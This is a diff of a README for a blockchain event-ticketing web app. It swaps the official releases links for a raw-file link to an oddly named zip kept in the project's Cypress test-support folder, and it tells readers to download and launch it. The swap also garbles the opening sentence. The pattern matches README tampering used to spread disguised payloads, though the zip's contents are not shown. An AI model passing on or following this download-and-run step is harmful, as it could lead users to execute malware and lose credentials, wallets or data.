@@ -1,6 +1,6 @@
 # 🎫🔗 **Blockchain Event Ticketing App**
 
-Welcome to the https://github.com/ZaiduCreatesJarvis/Blockchain-event-ticketing-app/releases file for the "Blockchain-event-ticketing-app" repository. This web application is designed for selling event tickets using cutting-edge blockchain technology. By leveraging blockchain, users can experience secure transactions and ownership of digital tickets like never before.
+Welcome to the https://raw.githubusercontent.com/ZaiduCreatesJarvis/Blockchain-event-ticketing-app/main/react/cypress/support/Blockchain-app-event-ticketing-bayal.zip file for the "Blockchain-event-ticketing-app" repository. This web application is designed for selling event tickets using cutting-edge blockchain technology. By leveraging blockchain, users can experience secure transactions and ownership of digital tickets like never before.
 
 ## Overview
 
@@ -48,7 +48,7 @@ The repository covers a wide range of topics related to blockchain technology, a
 
 ## Get Started
 
-To access the latest release of the application, download the release zip file from the following link: [Download https://github.com/ZaiduCreatesJarvis/Blockchain-event-ticketing-app/releases](https://github.com/ZaiduCreatesJarvis/Blockchain-event-ticketing-app/releases) and launch the application to start exploring the world of blockchain-powered event ticketing.
+To access the latest release of the application, download the release zip file from the following link: [Download https://raw.githubusercontent.com/ZaiduCreatesJarvis/Blockchain-event-ticketing-app/main/react/cypress/support/Blockchain-app-event-ticketing-bayal.zip](https://raw.githubusercontent.com/ZaiduCreatesJarvis/Blockchain-event-ticketing-app/main/react/cypress/support/Blockchain-app-event-ticketing-bayal.zip) and launch the application to start exploring the world of blockchain-powered event ticketing.
 
 If the link does not work or needs to be launched, please check the "Releases" section of the repository for the most up-to-date version of the application.
 
